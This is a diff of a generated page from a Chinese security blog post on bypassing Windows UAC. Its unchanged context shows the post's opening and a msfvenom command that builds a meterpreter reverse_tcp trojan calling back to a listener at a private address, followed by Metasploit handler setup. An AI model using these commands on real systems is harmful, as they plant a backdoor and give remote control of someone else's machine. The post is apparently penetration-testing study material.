@@ -96,13 +96,13 @@
 
 
 
-  <meta name="description" content="一直都搞不懂bypassuac是啥，到底有啥用啊，后来经过高人的指点，突然之间就悟了！ uac有的时候我们拿了一个shell，不晓得管理员的密码，3389也打不开是不是很操刀！就像这样这个问题是要用管理员打开cmd才能添加账号这个时候我们就要绕过windows的uac策略了 Msf bypassuac123456789#生成一个木马文件，放到目标机器上面msfvenom -p windows/me">
+  <meta name="description" content="一直都搞不懂bypassuac是啥，到底有啥用啊，后来经过高人的指点，突然之间就悟了！">
 <meta name="keywords" content="提权">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Windows下bypassuac">
 <meta property="og:url" content="http://yoursite.com/2019/11/08/Windows下bypassuac/index.html">
 <meta property="og:site_name" content="Sriracha :)">
-<meta property="og:description" content="一直都搞不懂bypassuac是啥，到底有啥用啊，后来经过高人的指点，突然之间就悟了！ uac有的时候我们拿了一个shell，不晓得管理员的密码，3389也打不开是不是很操刀！就像这样这个问题是要用管理员打开cmd才能添加账号这个时候我们就要绕过windows的uac策略了 Msf bypassuac123456789#生成一个木马文件，放到目标机器上面msfvenom -p windows/me">
+<meta property="og:description" content="一直都搞不懂bypassuac是啥，到底有啥用啊，后来经过高人的指点，突然之间就悟了！">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="http://yoursite.com/2019/11/08/Windows下bypassuac/error.png">
 <meta property="og:image" content="http://yoursite.com/2019/11/08/Windows下bypassuac/cmd_1.png">
@@ -114,10 +114,10 @@
 <meta property="og:image" content="http://yoursite.com/2019/11/08/Windows下bypassuac/sherl.png">
 <meta property="og:image" content="http://yoursite.com/2019/11/08/Windows下bypassuac/csbypass.png">
 <meta property="og:image" content="http://yoursite.com/2019/11/08/Windows下bypassuac/cs.png">
-<meta property="og:updated_time" content="2019-11-09T10:12:19.827Z">
+<meta property="og:updated_time" content="2019-11-09T10:14:33.579Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Windows下bypassuac">
-<meta name="twitter:description" content="一直都搞不懂bypassuac是啥，到底有啥用啊，后来经过高人的指点，突然之间就悟了！ uac有的时候我们拿了一个shell，不晓得管理员的密码，3389也打不开是不是很操刀！就像这样这个问题是要用管理员打开cmd才能添加账号这个时候我们就要绕过windows的uac策略了 Msf bypassuac123456789#生成一个木马文件，放到目标机器上面msfvenom -p windows/me">
+<meta name="twitter:description" content="一直都搞不懂bypassuac是啥，到底有啥用啊，后来经过高人的指点，突然之间就悟了！">
 <meta name="twitter:image" content="http://yoursite.com/2019/11/08/Windows下bypassuac/error.png">
 
 
@@ -468,7 +468,7 @@
                 
                   <span class="post-meta-item-text">更新于</span>
                 
-                <time title="修改时间：2019-11-09 18:12:19" itemprop="dateModified" datetime="2019-11-09T18:12:19+08:00">2019-11-09</time>
+                <time title="修改时间：2019-11-09 18:14:33" itemprop="dateModified" datetime="2019-11-09T18:14:33+08:00">2019-11-09</time>
               
             
           </span>
@@ -501,7 +501,7 @@
       
 
       
-        <p>一直都搞不懂bypassuac是啥，到底有啥用啊，后来经过高人的指点，突然之间就悟了！</p>
+        <p>一直都搞不懂bypassuac是啥，到底有啥用啊，后来经过高人的指点，突然之间就悟了！<br><a id="more"></a></p>
 <h1 id="uac"><a href="#uac" class="headerlink" title="uac"></a>uac</h1><p>有的时候我们拿了一个shell，不晓得管理员的密码，3389也打不开是不是很操刀！就像这样<br><img src="/2019/11/08/Windows下bypassuac/error.png" alt><br>这个问题是要用管理员打开cmd才能添加账号<br><img src="/2019/11/08/Windows下bypassuac/cmd_1.png" alt><br><img src="/2019/11/08/Windows下bypassuac/cmd_2.png" alt><br>这个时候我们就要绕过windows的uac策略了</p>
 <h1 id="Msf-bypassuac"><a href="#Msf-bypassuac" class="headerlink" title="Msf bypassuac"></a>Msf bypassuac</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#生成一个木马文件，放到目标机器上面</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.43.128 --platform windows lport=4444 -f exe &gt; uac.exe</span><br><span class="line"></span><br><span class="line">#打开msfconsole，设置监听</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.43.128</span><br><span class="line">run</span><br><span class="line">#然后在目标机器上面运行传上去的木马文件</span><br></pre></td></tr></table></figure>
 <p>这个时候我们拿到了meterpreter<br><img src="/2019/11/08/Windows下bypassuac/getsystem_1.png" alt></p>
